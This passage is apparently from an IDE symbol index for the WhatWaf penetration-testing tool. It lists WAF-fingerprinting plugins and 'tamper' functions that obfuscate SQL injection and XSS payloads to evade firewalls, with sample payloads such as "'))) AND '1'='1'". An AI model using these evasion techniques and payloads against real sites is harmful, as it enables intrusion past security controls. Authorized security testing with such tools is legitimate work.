        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    status = kwargs.get(\"status\", 0)\n    status_schema = (403, 500)\n    detection_schema = (\n        re.compile(r\"\\AX-Mapping-\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.SET_COOKIE, \"\")) is not None:\n            if status in status_schema:",
        "detail": "tools.whatwaf.content.plugins.stingray",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.stingray",
        "description": "tools.whatwaf.content.plugins.stingray",
        "peekOfCode": "__product__ = \"Stingray Application Firewall (Riverbed/Brocade)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    status = kwargs.get(\"status\", 0)\n    status_schema = (403, 500)\n    detection_schema = (\n        re.compile(r\"\\AX-Mapping-\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.SET_COOKIE, \"\")) is not None:",
        "detail": "tools.whatwaf.content.plugins.stingray",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.stricthttp",
        "description": "tools.whatwaf.content.plugins.stricthttp",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    status = kwargs.get(\"status\", 0)\n    detection_schema = (\n        re.compile(r\"the.request.was.rejected.because.the.url.contained.a.potentially.malicious.string\", re.I),\n    )\n    if status == 500:\n        for detection in detection_schema:\n            if detection.search(content) is not None:\n                return True",
        "detail": "tools.whatwaf.content.plugins.stricthttp",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.stricthttp",
        "description": "tools.whatwaf.content.plugins.stricthttp",
        "peekOfCode": "__product__ = \"StrictHttpFirewall (WAF)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    status = kwargs.get(\"status\", 0)\n    detection_schema = (\n        re.compile(r\"the.request.was.rejected.because.the.url.contained.a.potentially.malicious.string\", re.I),\n    )\n    if status == 500:\n        for detection in detection_schema:\n            if detection.search(content) is not None:",
        "detail": "tools.whatwaf.content.plugins.stricthttp",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.sucuri",
        "description": "tools.whatwaf.content.plugins.sucuri",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"access.denied.-.sucuri.website.firewall\", re.I),\n        re.compile(r\"sucuri.webSite.firewall.-.cloudProxy.-.access.denied\", re.I),\n        re.compile(r\"questions\\?.+cloudproxy@sucuri\\.net\", re.I),\n        re.compile(r\"http(s)?.\\/\\/(cdn|supportx.)?sucuri(.net|com)?\", re.I)\n    )\n    if headers is not None:",
        "detail": "tools.whatwaf.content.plugins.sucuri",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.sucuri",
        "description": "tools.whatwaf.content.plugins.sucuri",
        "peekOfCode": "__product__ = \"Sucuri Firewall (Sucuri Cloudproxy)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"access.denied.-.sucuri.website.firewall\", re.I),\n        re.compile(r\"sucuri.webSite.firewall.-.cloudProxy.-.access.denied\", re.I),\n        re.compile(r\"questions\\?.+cloudproxy@sucuri\\.net\", re.I),\n        re.compile(r\"http(s)?.\\/\\/(cdn|supportx.)?sucuri(.net|com)?\", re.I)\n    )",
        "detail": "tools.whatwaf.content.plugins.sucuri",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.teros",
        "description": "tools.whatwaf.content.plugins.teros",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"st8(id|.wa|.wf)?.?(\\d+|\\w+)?\", re.I),\n    )\n    if headers is not None:\n        for detection in detection_schema:\n            if len(headers) != 0:\n                for header in headers.keys():\n                    if detection.search(headers[header]) is not None:",
        "detail": "tools.whatwaf.content.plugins.teros",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.teros",
        "description": "tools.whatwaf.content.plugins.teros",
        "peekOfCode": "__product__ = \"Teros Web Application Firewall (Citrix)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"st8(id|.wa|.wf)?.?(\\d+|\\w+)?\", re.I),\n    )\n    if headers is not None:\n        for detection in detection_schema:\n            if len(headers) != 0:\n                for header in headers.keys():",
        "detail": "tools.whatwaf.content.plugins.teros",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.uewaf",
        "description": "tools.whatwaf.content.plugins.uewaf",
        "peekOfCode": "def detect(content, **kwargs):\n    detection_schema = (\n        re.compile(r\"http(s)?.//ucloud\", re.I),\n        re.compile(r\"uewaf(.deny.pages)\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.uewaf",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.uewaf",
        "description": "tools.whatwaf.content.plugins.uewaf",
        "peekOfCode": "__product__ = \"UEWaf (UCloud)\"\ndef detect(content, **kwargs):\n    detection_schema = (\n        re.compile(r\"http(s)?.//ucloud\", re.I),\n        re.compile(r\"uewaf(.deny.pages)\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.uewaf",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.unknown",
        "description": "tools.whatwaf.content.plugins.unknown",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    status = kwargs.get(\"status\", 0)\n    discovered = 0\n    # make sure that it's not just a `didn't find what you're looking for` page\n    # this will probably help out a lot with random WAF detection\n    if status == 200 or \"not found\" in content.lower():\n        return False\n    if status == 404:",
        "detail": "tools.whatwaf.content.plugins.unknown",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.unknown",
        "description": "tools.whatwaf.content.plugins.unknown",
        "peekOfCode": "__product__ = \"Unknown Firewall\"\ndef detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    status = kwargs.get(\"status\", 0)\n    discovered = 0\n    # make sure that it's not just a `didn't find what you're looking for` page\n    # this will probably help out a lot with random WAF detection\n    if status == 200 or \"not found\" in content.lower():\n        return False",
        "detail": "tools.whatwaf.content.plugins.unknown",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.urlscan",
        "description": "tools.whatwaf.content.plugins.urlscan",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"rejected.by.url.scan\", re.I),\n        re.compile(r\"/rejected.by.url.scan\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True\n        if detection.search(headers.get(HTTP_HEADER.LOCATION, \"\")) is not None:",
        "detail": "tools.whatwaf.content.plugins.urlscan",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.urlscan",
        "description": "tools.whatwaf.content.plugins.urlscan",
        "peekOfCode": "__product__ = \"UrlScan (Microsoft)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"rejected.by.url.scan\", re.I),\n        re.compile(r\"/rejected.by.url.scan\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.urlscan",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.varnish",
        "description": "tools.whatwaf.content.plugins.varnish",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"\\bxid. \\d+\", re.I),\n        re.compile(r\"varnish\", re.I),\n        re.compile(r\".>.?security.by.cachewall.?<.\", re.I),\n        re.compile(r\"cachewall\", re.I),\n        re.compile(r\".>access.is.blocked.according.to.our.site.security.policy.<+\", re.I)\n    )",
        "detail": "tools.whatwaf.content.plugins.varnish",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.varnish",
        "description": "tools.whatwaf.content.plugins.varnish",
        "peekOfCode": "__product__ = \"Varnish/CacheWall WAF\"\ndef detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"\\bxid. \\d+\", re.I),\n        re.compile(r\"varnish\", re.I),\n        re.compile(r\".>.?security.by.cachewall.?<.\", re.I),\n        re.compile(r\"cachewall\", re.I),\n        re.compile(r\".>access.is.blocked.according.to.our.site.security.policy.<+\", re.I)",
        "detail": "tools.whatwaf.content.plugins.varnish",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.viettel",
        "description": "tools.whatwaf.content.plugins.viettel",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        # https://github.com/0xInfection/Awesome-WAF\n        re.compile(r\"<title>access.denied(...)?viettel.waf</title>\", re.I),\n        re.compile(r\"viettel.waf.system\", re.I),\n        re.compile(r\"(http(s).//)?cloudrity.com(.vn)?\")\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:",
        "detail": "tools.whatwaf.content.plugins.viettel",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.viettel",
        "description": "tools.whatwaf.content.plugins.viettel",
        "peekOfCode": "__product__ = \"Viettel WAF (Cloudrity)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        # https://github.com/0xInfection/Awesome-WAF\n        re.compile(r\"<title>access.denied(...)?viettel.waf</title>\", re.I),\n        re.compile(r\"viettel.waf.system\", re.I),\n        re.compile(r\"(http(s).//)?cloudrity.com(.vn)?\")\n    )\n    for detection in detection_schema:",
        "detail": "tools.whatwaf.content.plugins.viettel",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.wallarm",
        "description": "tools.whatwaf.content.plugins.wallarm",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"nginix.wallarm\"),\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.SERVER, \"\")) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.wallarm",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.wallarm",
        "description": "tools.whatwaf.content.plugins.wallarm",
        "peekOfCode": "__product__ = \"Wallarm WAF\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"nginix.wallarm\"),\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.SERVER, \"\")) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.wallarm",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.watchguard",
        "description": "tools.whatwaf.content.plugins.watchguard",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"(request.denied.by.)?watchguard.firewall\", re.I),\n        re.compile(r\"watchguard(.technologies(.inc)?)?\", re.I),\n    )\n    server = headers.get(HTTP_HEADER.SERVER, \"\")\n    if \"watchguard\" in server.lower():\n        return True",
        "detail": "tools.whatwaf.content.plugins.watchguard",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.watchguard",
        "description": "tools.whatwaf.content.plugins.watchguard",
        "peekOfCode": "__product__ = \"WatchGuard WAF\"\ndef detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"(request.denied.by.)?watchguard.firewall\", re.I),\n        re.compile(r\"watchguard(.technologies(.inc)?)?\", re.I),\n    )\n    server = headers.get(HTTP_HEADER.SERVER, \"\")\n    if \"watchguard\" in server.lower():",
        "detail": "tools.whatwaf.content.plugins.watchguard",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.webknight",
        "description": "tools.whatwaf.content.plugins.webknight",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    status = kwargs.get(\"status\", 0)\n    detection_schema = (\n        re.compile(r\"\\bwebknight\", re.I),\n        re.compile(r\"webknight\", re.I)\n    )\n    if status is not None:\n        if status == 999 and headers.get(HTTP_HEADER.SERVER, \"\") == \"WebKnight\":\n            return True",
        "detail": "tools.whatwaf.content.plugins.webknight",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.webknight",
        "description": "tools.whatwaf.content.plugins.webknight",
        "peekOfCode": "__product__ = \"WebKnight Application Firewall (AQTRONIX)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    status = kwargs.get(\"status\", 0)\n    detection_schema = (\n        re.compile(r\"\\bwebknight\", re.I),\n        re.compile(r\"webknight\", re.I)\n    )\n    if status is not None:\n        if status == 999 and headers.get(HTTP_HEADER.SERVER, \"\") == \"WebKnight\":",
        "detail": "tools.whatwaf.content.plugins.webknight",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.webseal",
        "description": "tools.whatwaf.content.plugins.webseal",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"webseal.error.message.template\", re.I),\n        re.compile(r\"webseal.server.received.an.invalid.http.request\", re.I)\n    )\n    if headers.get(HTTP_HEADER.SERVER, \"\") == \"WebSEAL\":\n        return True\n    for detection in list(detection_schema):",
        "detail": "tools.whatwaf.content.plugins.webseal",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.webseal",
        "description": "tools.whatwaf.content.plugins.webseal",
        "peekOfCode": "__product__ = \"IBM Security Access Manager (WebSEAL)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"webseal.error.message.template\", re.I),\n        re.compile(r\"webseal.server.received.an.invalid.http.request\", re.I)\n    )\n    if headers.get(HTTP_HEADER.SERVER, \"\") == \"WebSEAL\":\n        return True",
        "detail": "tools.whatwaf.content.plugins.webseal",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.west263",
        "description": "tools.whatwaf.content.plugins.west263",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"wt\\d*cdn\", re.I),\n    )\n    for detection in detection_schema:\n        if headers is not None:\n            if detection.search(headers.get(HTTP_HEADER.X_CACHE, \"\")) is not None:\n                return True",
        "detail": "tools.whatwaf.content.plugins.west263",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.west263",
        "description": "tools.whatwaf.content.plugins.west263",
        "peekOfCode": "__product__ = \"West236 Firewall\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"wt\\d*cdn\", re.I),\n    )\n    for detection in detection_schema:\n        if headers is not None:\n            if detection.search(headers.get(HTTP_HEADER.X_CACHE, \"\")) is not None:\n                return True",
        "detail": "tools.whatwaf.content.plugins.west263",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.wordfence",
        "description": "tools.whatwaf.content.plugins.wordfence",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"generated.by.wordfence\", re.I),\n        re.compile(r\"your.access.to.this.site.has.been.limited\", re.I),\n        re.compile(r\".>wordfence<.\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.wordfence",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.wordfence",
        "description": "tools.whatwaf.content.plugins.wordfence",
        "peekOfCode": "__product__ = \"Wordfence (Feedjit)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"generated.by.wordfence\", re.I),\n        re.compile(r\"your.access.to.this.site.has.been.limited\", re.I),\n        re.compile(r\".>wordfence<.\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:",
        "detail": "tools.whatwaf.content.plugins.wordfence",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.wts",
        "description": "tools.whatwaf.content.plugins.wts",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"(<title>)?wts.wa(f)?(\\w+(\\w+(\\w+)?)?)?\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.wts",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.wts",
        "description": "tools.whatwaf.content.plugins.wts",
        "peekOfCode": "__product__ = \"WTS-WAF (Web Application Firewall)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"(<title>)?wts.wa(f)?(\\w+(\\w+(\\w+)?)?)?\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.wts",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.xuanwudun",
        "description": "tools.whatwaf.content.plugins.xuanwudun",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    status = kwargs.get(\"status\", 0)\n    detection_schema = (\n        re.compile(r\"class=.(db)?waf.?(-row.)?>\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            if status is not None and status == 403:\n                return True",
        "detail": "tools.whatwaf.content.plugins.xuanwudun",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.xuanwudun",
        "description": "tools.whatwaf.content.plugins.xuanwudun",
        "peekOfCode": "__product__ = \"Xuanwudun WAF\"\ndef detect(content, **kwargs):\n    content = str(content)\n    status = kwargs.get(\"status\", 0)\n    detection_schema = (\n        re.compile(r\"class=.(db)?waf.?(-row.)?>\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            if status is not None and status == 403:",
        "detail": "tools.whatwaf.content.plugins.xuanwudun",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.yundun",
        "description": "tools.whatwaf.content.plugins.yundun",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    status = kwargs.get(\"status\", 0)\n    detection_schema = (\n        re.compile(r\"YUNDUN\", re.I),\n        re.compile(r\"^yd.cookie=\", re.I),\n        re.compile(r\"http(s)?.//(www\\.)?(\\w+.)?yundun(.com)?\", re.I),\n        re.compile(r\"<title>.403.forbidden:.access.is.denied.{0,2}<.{0,2}title>\", re.I)\n    )\n    if headers is not None:",
        "detail": "tools.whatwaf.content.plugins.yundun",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.yundun",
        "description": "tools.whatwaf.content.plugins.yundun",
        "peekOfCode": "__product__ = \"Yundun Web Application Firewall (Yundun)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    status = kwargs.get(\"status\", 0)\n    detection_schema = (\n        re.compile(r\"YUNDUN\", re.I),\n        re.compile(r\"^yd.cookie=\", re.I),\n        re.compile(r\"http(s)?.//(www\\.)?(\\w+.)?yundun(.com)?\", re.I),\n        re.compile(r\"<title>.403.forbidden:.access.is.denied.{0,2}<.{0,2}title>\", re.I)\n    )",
        "detail": "tools.whatwaf.content.plugins.yundun",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.yunsuo",
        "description": "tools.whatwaf.content.plugins.yunsuo",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"<img.class=.yunsuologo.\", re.I),\n        re.compile(r\"yunsuo.session\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.yunsuo",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.yunsuo",
        "description": "tools.whatwaf.content.plugins.yunsuo",
        "peekOfCode": "__product__ = \"Yunsuo Web Application Firewall (Yunsuo)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"<img.class=.yunsuologo.\", re.I),\n        re.compile(r\"yunsuo.session\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:",
        "detail": "tools.whatwaf.content.plugins.yunsuo",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.zscaler",
        "description": "tools.whatwaf.content.plugins.zscaler",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"zscaler(.\\d+(.\\d+)?)?\", re.I),\n        re.compile(r\"zscaler\", re.I)\n    )\n    for detection in detection_schema:\n        if headers is not None:\n            if detection.search(headers.get(HTTP_HEADER.SERVER, \"\")) is not None:",
        "detail": "tools.whatwaf.content.plugins.zscaler",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.zscaler",
        "description": "tools.whatwaf.content.plugins.zscaler",
        "peekOfCode": "__product__ = \"Zscaler Cloud Firewall (WAF)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"zscaler(.\\d+(.\\d+)?)?\", re.I),\n        re.compile(r\"zscaler\", re.I)\n    )\n    for detection in detection_schema:\n        if headers is not None:",
        "detail": "tools.whatwaf.content.plugins.zscaler",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.apostrephemask",
        "description": "tools.whatwaf.content.tampers.apostrephemask",
        "peekOfCode": "def tamper(payload, **kwargs):\n    payload = str(payload)\n    identifier = \"'\"\n    retval = \"\"\n    for char in payload:\n        if char == identifier:\n            retval += \"%EF%BC%87\"\n        else:\n            retval += char\n    return retval",
        "detail": "tools.whatwaf.content.tampers.apostrephemask",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.apostrephemask",
        "description": "tools.whatwaf.content.tampers.apostrephemask",
        "peekOfCode": "__example_payload__ = \"'))) AND '1'='1' ((('\"\n__type__ = \"hiding an apostrophe by its UTF equivalent\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    identifier = \"'\"\n    retval = \"\"\n    for char in payload:\n        if char == identifier:\n            retval += \"%EF%BC%87\"\n        else:",
        "detail": "tools.whatwaf.content.tampers.apostrephemask",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.apostrephemask",
        "description": "tools.whatwaf.content.tampers.apostrephemask",
        "peekOfCode": "__type__ = \"hiding an apostrophe by its UTF equivalent\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    identifier = \"'\"\n    retval = \"\"\n    for char in payload:\n        if char == identifier:\n            retval += \"%EF%BC%87\"\n        else:\n            retval += char",
        "detail": "tools.whatwaf.content.tampers.apostrephemask",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.apostrephenullify",
        "description": "tools.whatwaf.content.tampers.apostrephenullify",
        "peekOfCode": "def tamper(payload, **kwargs):\n    payload = str(payload)\n    identifier = \"'\"\n    retval = \"\"\n    for char in payload:\n        if char == identifier:\n            retval += \"%00%27\"\n        else:\n            retval += char\n    return retval",
        "detail": "tools.whatwaf.content.tampers.apostrephenullify",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.apostrephenullify",
        "description": "tools.whatwaf.content.tampers.apostrephenullify",
        "peekOfCode": "__example_payload__ = \"' )) AND 1=1 ' OR '2'='3 --'\"\n__type__ = \"hiding the apostrophe by passing it with a NULL character\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    identifier = \"'\"\n    retval = \"\"\n    for char in payload:\n        if char == identifier:\n            retval += \"%00%27\"\n        else:",
        "detail": "tools.whatwaf.content.tampers.apostrephenullify",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.apostrephenullify",
        "description": "tools.whatwaf.content.tampers.apostrephenullify",
        "peekOfCode": "__type__ = \"hiding the apostrophe by passing it with a NULL character\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    identifier = \"'\"\n    retval = \"\"\n    for char in payload:\n        if char == identifier:\n            retval += \"%00%27\"\n        else:\n            retval += char",
        "detail": "tools.whatwaf.content.tampers.apostrephenullify",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.appendnull",
        "description": "tools.whatwaf.content.tampers.appendnull",
        "peekOfCode": "def tamper(payload, **kwargs):\n    payload = str(payload)\n    return \"{}%00\".format(payload)",
        "detail": "tools.whatwaf.content.tampers.appendnull",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.appendnull",
        "description": "tools.whatwaf.content.tampers.appendnull",
        "peekOfCode": "__example_payload__ = \"AND 1=1\"\n__type__ = \"appending a NULL byte to the end of the payload\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    return \"{}%00\".format(payload)",
        "detail": "tools.whatwaf.content.tampers.appendnull",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.appendnull",
        "description": "tools.whatwaf.content.tampers.appendnull",
        "peekOfCode": "__type__ = \"appending a NULL byte to the end of the payload\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    return \"{}%00\".format(payload)",
        "detail": "tools.whatwaf.content.tampers.appendnull",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.base64encode",
        "description": "tools.whatwaf.content.tampers.base64encode",
        "peekOfCode": "def tamper(payload, **kwargs):\n    try:\n        payload = str(payload)\n        return str(base64.b64encode(payload))\n    except TypeError:\n        payload = payload.encode(\"utf-8\")\n        return base64.b64encode(payload).decode(\"ascii\")",
        "detail": "tools.whatwaf.content.tampers.base64encode",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.base64encode",
        "description": "tools.whatwaf.content.tampers.base64encode",
        "peekOfCode": "__example_payload__ = \"<script>alert(\"\");</script>\"\n__type__ = \"encoding the payload into its base64 equivalent\"\ndef tamper(payload, **kwargs):\n    try:\n        payload = str(payload)\n        return str(base64.b64encode(payload))\n    except TypeError:\n        payload = payload.encode(\"utf-8\")\n        return base64.b64encode(payload).decode(\"ascii\")",
        "detail": "tools.whatwaf.content.tampers.base64encode",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.base64encode",
        "description": "tools.whatwaf.content.tampers.base64encode",
        "peekOfCode": "__type__ = \"encoding the payload into its base64 equivalent\"\ndef tamper(payload, **kwargs):\n    try:\n        payload = str(payload)\n        return str(base64.b64encode(payload))\n    except TypeError:\n        payload = payload.encode(\"utf-8\")\n        return base64.b64encode(payload).decode(\"ascii\")",
        "detail": "tools.whatwaf.content.tampers.base64encode",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.booleanmask",
        "description": "tools.whatwaf.content.tampers.booleanmask",
        "peekOfCode": "def tamper(payload, **kwargs):\n    return re.sub(r\"(?i)and\", \"%26%26\", re.sub(r\"(?i)or\", \"%7C%7C\", payload))",
        "detail": "tools.whatwaf.content.tampers.booleanmask",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.booleanmask",
